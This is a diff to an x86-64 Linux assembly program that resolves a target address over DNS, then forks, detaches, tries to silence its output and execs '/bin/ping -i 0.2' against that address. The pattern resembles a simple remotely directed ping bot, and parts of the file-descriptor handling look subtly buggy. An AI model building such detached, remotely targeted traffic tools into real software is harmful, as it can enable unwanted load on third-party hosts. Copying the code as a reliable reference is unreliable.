@@ -39,6 +39,9 @@ section .data
     time_sleep dq 20
                dq 0
                
+    command db '/bin/ping',0x00
+
+    null db '/dev/null',0x00
                
 
 
@@ -60,6 +63,8 @@ section .bss
     dns_ID: resw 1
 
     target_ip: resb 16
+
+
 
 section .text
 
@@ -114,6 +119,7 @@ _start:
     syscall ; udp recvfrom
 
     cmp rax, 0x00 ; check if the recvfrom failed
+
     jg next
     
     mov rdi, [rbp - 0x08] ; socket fd
@@ -140,9 +146,29 @@ next:
     mov rdx, [rbp - 0x10] ; buffer size
     call parse_answer ; parse the answer
 
+    mov rdi, target_ip ; buffer
+    call reformat_ip ; reformat the ip address
+
+
+    mov rax, 0x39
+    syscall ; fork()
+    cmp rax, 0x00
+    jne exit ; exit the parent process
+
+    mov rdi, null ; buffer
+    mov rsi, 0x01 ; flags
+    mov rax, 0x02
+    syscall ; open /dev/null
+
+
+
+    mov rdi, target_ip ; buffer
+    mov rsi, rax
+    call send_ping
+
     mov rdi, 0x01 ; stdout
     mov rsi, target_ip ; buffer
-    mov rdx, 0x10 ; buffer size
+    mov rdx, rax ; buffer size
     mov rax, 0x01
     syscall ; write the received data to stdout
 
@@ -151,6 +177,8 @@ next:
     mov rax, 0x3
     syscall ; close the socket
 
+
+exit:
 
 
     mov rdi, 0 ; exit code
@@ -185,7 +213,7 @@ create_message:
 
 
 
-;;;
+
 
 
 write_dns_request:
@@ -302,6 +330,80 @@ parse_answer:
 
     leave
     ret
+
+
+reformat_ip:
+
+    push rbp
+    mov rbp, rsp
+    sub rsp, 0x40
+
+    xor rcx, rcx
+
+    reformat_ip_loop:
+
+        mov al, byte [rdi+rcx]
+        cmp al, 0x41
+        je reformat_ip_end
+        inc rcx
+        jmp reformat_ip_loop
+
+    reformat_ip_end:
+
+        mov [rdi+rcx], byte 0x00
+        mov rax, rcx
+
+    leave
+    ret
+
+
+
+send_ping:
+
+    push rbp
+    mov rbp, rsp
+    sub rsp, 0x40
+
+    push rdi
+
+    mov rdi, 0x01
+    mov rsi, rsi
+    mov rax, 0x21
+    syscall ; redirect output of stdout to /dev/null
+
+    mov rdi, 0x01
+    mov rax, 0x03
+    syscall ; close the stdout
+
+    pop rdi
+
+
+
+    xor rdx, rdx
+
+    xor rax, rax
+    mov rbx, '-i'
+    mov rcx, '0.2'
+    push rcx
+    mov rcx, rsp
+    push rbx
+    mov rbx, rsp
+
+    push rax
+    push rdi
+    push rcx
+    push rbx
+    push command
+    mov rsi, rsp
+    mov rdi, command
+    mov rax, 0x3b
+    syscall
+
+    leave
+    ret
+
+
+
 
 
     
